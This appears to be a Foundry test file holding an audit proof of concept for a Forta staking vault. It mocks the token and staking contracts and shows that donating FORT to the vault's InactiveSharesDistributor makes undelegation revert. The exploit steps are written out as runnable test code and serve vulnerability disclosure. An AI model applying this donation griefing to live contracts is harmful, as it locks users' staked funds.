// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
import {IFortaStaking} from "../src/interfaces/IFortaStaking.sol";
import {FortaStakingVault} from "../src/FortaStakingVault.sol";
import {InactiveSharesDistributor} from "../src/InactiveSharesDistributor.sol";
import {RedemptionReceiver} from "../src/RedemptionReceiver.sol";

contract MockFORT is ERC20 {
    constructor() ERC20("Forta", "FORT") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @dev Only the external Forta staking calls used by the audited vault are
/// modeled. The vault and distributor themselves are the exact vulnerable
/// source, including InactiveSharesDistributor.undelegate().
contract MockFortaStaking {
    IERC20 internal immutable token;
    uint256 internal immutable withdrawalAmount;

    constructor(IERC20 token_, uint256 withdrawalAmount_) {
        token = token_;
        withdrawalAmount = withdrawalAmount_;
    }

    function deposit(uint8, uint256, uint256 amount) external returns (uint256) {
        token.transferFrom(msg.sender, address(this), amount);
        return amount;
    }

    function safeTransferFrom(address, address, uint256, uint256, bytes calldata) external {}

    function initiateWithdrawal(uint8, uint256, uint256) external view returns (uint64) {
        return uint64(block.timestamp + 1);
    }

    function withdraw(uint8, uint256) external returns (uint256) {
        token.transfer(msg.sender, withdrawalAmount);
        return withdrawalAmount;
    }

    function activeSharesToStake(uint256, uint256) external pure returns (uint256) {
        return 0;
    }

    function inactiveSharesToStake(uint256, uint256 amount) external pure returns (uint256) {
        return amount;
    }

    function balanceOf(address, uint256) external pure returns (uint256) {
        return 0;
    }

    function isFrozen(uint8, uint256) external pure returns (bool) {
        return false;
    }
}

contract PoC_32467 is Test {
    using Clones for address;

    uint256 internal constant SUBJECT = 55;
    uint256 internal constant STAKE = 100 ether;

    MockFORT internal fort;
    MockFortaStaking internal staking;
    FortaStakingVault internal vault;

    function setUp() public {
        fort = new MockFORT();
        staking = new MockFortaStaking(fort, STAKE);

        FortaStakingVault vaultImplementation = new FortaStakingVault();
        InactiveSharesDistributor distributorImplementation = new InactiveSharesDistributor();
        RedemptionReceiver receiverImplementation = new RedemptionReceiver();

        vault = FortaStakingVault(address(vaultImplementation).clone());
        vault.initialize(
            address(fort),
            address(staking),
            address(receiverImplementation),
            address(distributorImplementation),
            0,
            address(this),
            address(0)
        );

        // Seed the vault's delegated position and the staking contract's
        // withdrawal liquidity.
        fort.mint(address(vault), STAKE);
        fort.mint(address(staking), STAKE);
        vault.delegate(SUBJECT, STAKE);
    }

    function test_donationStallsExactVaultUndelegation() public {
        (, address distributor) = vault.initiateUndelegate(SUBJECT, STAKE);

        // Anyone can donate FORT to the distributor before the withdrawal.
        address attacker = address(0xA11CE);
        fort.mint(attacker, 1 ether);
        vm.prank(attacker);
        fort.transfer(distributor, 1 ether);

        vm.warp(block.timestamp + 2);
        vm.expectRevert();
        vault.undelegate(SUBJECT);
    }
}
